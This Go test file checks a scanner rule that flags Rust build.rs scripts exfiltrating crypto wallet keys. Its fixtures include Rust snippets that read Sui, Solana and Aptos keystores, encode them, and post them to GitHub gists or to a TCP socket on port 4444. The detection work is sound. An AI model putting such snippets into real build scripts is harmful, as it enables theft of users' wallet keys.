package rsbuild

import (
	"context"
	"testing"

	"github.com/garagon/aguara/internal/scanner"
)

func fires(t *testing.T, name, src string) bool {
	t.Helper()
	a := New()
	f, err := a.Analyze(context.Background(), &scanner.Target{RelPath: name, Content: []byte(src)})
	if err != nil {
		t.Fatalf("analyze: %v", err)
	}
	for _, x := range f {
		if x.RuleID == RuleBuildWalletExfil {
			return true
		}
	}
	return false
}

func TestTruePositives(t *testing.T) {
	cases := []struct{ name, src string }{
		{
			"read keystore -> encode -> POST",
			`fn main() {
    let key = std::fs::read_to_string(format!("{}/.sui/sui_config/sui.keystore", home)).unwrap();
    let enc = xor(key.as_bytes(), b"cargo-build-helper-2026");
    ureq::post("https://api.github.com/gists").send_string(&base64::encode(enc));
}`,
		},
		{
			"read Solana id -> body -> network",
			`fn main() {
    let id = std::fs::read("/home/u/.config/solana/id.json").unwrap();
    reqwest::blocking::Client::new().post("https://gist.github.com/api").body(base64::encode(id)).send().ok();
}`,
		},
		{
			"source used inline in the sink (no separate transform var)",
			`fn main() {
    let ks = std::fs::read_to_string(format!("{}/.aptos/keystore.json", h)).unwrap();
    TcpStream::connect("10.0.0.1:4444").unwrap().write_all(ks.as_bytes()).ok();
}`,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if !fires(t, "build.rs", c.src) {
				t.Fatalf("expected RS_BUILD_WALLET_EXFIL_001 to fire")
			}
		})
	}
}

func TestFalsePositives(t *testing.T) {
	cases := []struct{ name, src string }{
		{
			"read wallet but no network",
			`fn main() {
    let cfg = std::fs::read_to_string("$HOME/.solana/id.json").unwrap();
    println!("cargo:rerun-if-changed={}", cfg);
}`,
		},
		{
			"network but no wallet",
			`fn main() {
    ureq::get("https://crates.io/api/v1/crates/foo").call().unwrap();
}`,
		},
		{
			"cc::Build native compile",
			`fn main() {
    cc::Build::new().file("src/native/foo.c").compile("foo");
}`,
		},
		{
			"path constructed but never read",
			`fn main() {
    let p = PathBuf::from(home).join(".sui").join("sui.keystore");
    let _meta = ureq::get("https://crates.io/api/v1/crates/foo").call().unwrap();
}`,
		},
		{
			"line comment with a read + network",
			`fn main() {
    // std::fs::read_to_string("~/.sui/sui_config/sui.keystore") then ureq::post(...)
    println!("ok");
}`,
		},
		{
			"block comment with a read + network",
			`fn main() {
    /*
    let key = std::fs::read_to_string("~/.sui/sui_config/sui.keystore").unwrap();
    ureq::post("https://api.github.com/gists").send_string(&key);
    */
    println!("ok");
}`,
		},
		{
			"tainted var referenced in a separate statement on the sink line, not sent",
			`fn main() {
    let key = std::fs::read_to_string("~/.sui/sui.keystore").unwrap();
    let _debug = &key; ureq::get("https://crates.io/api/v1/crates/foo").call().unwrap();
}`,
		},
		{
			"network call then println of the tainted var, not sent",
			`fn main() {
    let key = std::fs::read_to_string("~/.sui/sui.keystore").unwrap();
    reqwest::blocking::Client::new().post("https://example.com").send().ok(); println!("{}", key);
}`,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if fires(t, "build.rs", c.src) {
				t.Fatalf("expected NO finding")
			}
		})
	}
}

func TestFlowSensitivity(t *testing.T) {
	cases := []struct{ name, src string }{
		{
			"sink before the read",
			`fn main() {
    ureq::post("https://api.github.com/gists").send_string(&key);
    let key = std::fs::read_to_string("~/.sui/sui.keystore").unwrap();
}`,
		},
		{
			"tainted var rebound to a safe value before the sink",
			`fn main() {
    let key = std::fs::read_to_string("~/.sui/sui.keystore").unwrap();
    let key = String::from("benign");
    ureq::post("https://api.github.com/gists").send_string(&key);
}`,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if fires(t, "build.rs", c.src) {
				t.Fatalf("flow-sensitive analysis must NOT fire")
			}
		})
	}
}

func TestPrecisionOnlyBuildRs(t *testing.T) {
	src := `fn main() {
    let key = std::fs::read_to_string("~/.sui/sui_config/sui.keystore").unwrap();
    ureq::post("https://api.github.com/gists").send_string(&base64::encode(key));
}`
	if fires(t, "src/main.rs", src) {
		t.Fatal("must not fire on src/main.rs (only build.rs is a target)")
	}
	if !fires(t, "build.rs", src) {
		t.Fatal("must fire on build.rs")
	}
}
